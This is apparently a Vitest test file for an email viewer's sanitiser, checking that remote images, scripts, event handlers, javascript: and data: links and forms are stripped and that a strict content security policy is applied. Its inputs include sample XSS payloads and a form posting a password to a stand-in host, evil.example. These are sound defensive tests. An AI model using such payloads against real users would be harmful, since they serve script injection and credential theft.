import { describe, it, expect } from 'vitest';
import { buildEmailBody } from '../emailBody';
import type { EmailAttachmentView } from '../emailMessage';

/**
 * What a rendered message may and may not do. These are the security
 * properties of the viewer, so they are asserted on the DOCUMENT that goes
 * into the frame — the thing a browser would actually execute.
 */
describe('a rendered email body', () => {
  const inlineLogo: EmailAttachmentView = {
    name: 'logo.png',
    mimeType: 'image/png',
    sizeBytes: 3,
    contentId: 'logo@sender',
    bytes: new Uint8Array([1, 2, 3]),
  };

  it('renders an image the sender EMBEDDED, without any network', () => {
    const { srcDoc, blockedRemoteImages } = buildEmailBody(
      '<p>Hi</p><img src="cid:logo@sender">',
      [inlineLogo],
    );
    expect(srcDoc).toContain('data:image/png;base64,');
    expect(blockedRemoteImages).toBe(0);
  });

  it('drops a REMOTE image — a tracking pixel cannot report that the mail was opened', () => {
    const { srcDoc, blockedRemoteImages } = buildEmailBody(
      '<p>Hi</p><img src="https://tracker.example/pixel.gif?id=42" width="1" height="1">',
      [],
    );
    expect(srcDoc).not.toContain('tracker.example');
    expect(blockedRemoteImages).toBe(1);
  });

  it('drops a cid: image whose bytes were not retained, rather than fetching anything', () => {
    const { srcDoc, blockedRemoteImages } = buildEmailBody('<img src="cid:missing@x">', []);
    expect(srcDoc).not.toContain('cid:');
    expect(blockedRemoteImages).toBe(1);
  });

  it('carries no script, however the sender spelled it', () => {
    const { srcDoc } = buildEmailBody(
      `<p onclick="steal()">Hi</p><script>steal()</script><img src=x onerror="steal()">`,
      [],
    );
    expect(srcDoc).not.toContain('steal()');
    expect(srcDoc).not.toContain('onerror');
    expect(srcDoc).not.toContain('onclick');
  });

  it('states a policy that forbids every outbound request', () => {
    const { srcDoc } = buildEmailBody('<p>Hi</p>', []);
    expect(srcDoc).toContain("default-src 'none'");
    expect(srcDoc).toContain('img-src data:');
    expect(srcDoc).toContain("connect-src 'none'");
    expect(srcDoc).toContain("form-action 'none'");
  });

  it('makes links INERT and reports them for the parent to show', () => {
    const { srcDoc, links } = buildEmailBody(
      '<p>See <a href="https://example.com/deal?id=7">this offer</a> today</p>',
      [],
    );
    // The address never appears in the frame, and no anchor can be followed.
    expect(srcDoc).not.toContain('example.com');
    expect(srcDoc).not.toContain('<script');
    expect(srcDoc).toContain('[1]');
    expect(links).toEqual([{ index: 1, text: 'this offer', url: 'https://example.com/deal?id=7' }]);
  });

  it('does not present a javascript: or data: link as a link at all', () => {
    const { srcDoc, links } = buildEmailBody(
      `<a href="javascript:steal()">click</a><a href="data:text/html,<script>x</script>">or here</a>`,
      [],
    );
    expect(links).toEqual([]);
    expect(srcDoc).not.toContain('javascript:');
  });

  it('drops a form, so no message can post anywhere', () => {
    const { srcDoc } = buildEmailBody(
      '<form action="https://evil.example/steal"><input name="password"></form>',
      [],
    );
    expect(srcDoc).not.toContain('evil.example');
    expect(srcDoc).not.toContain('<input');
  });
});
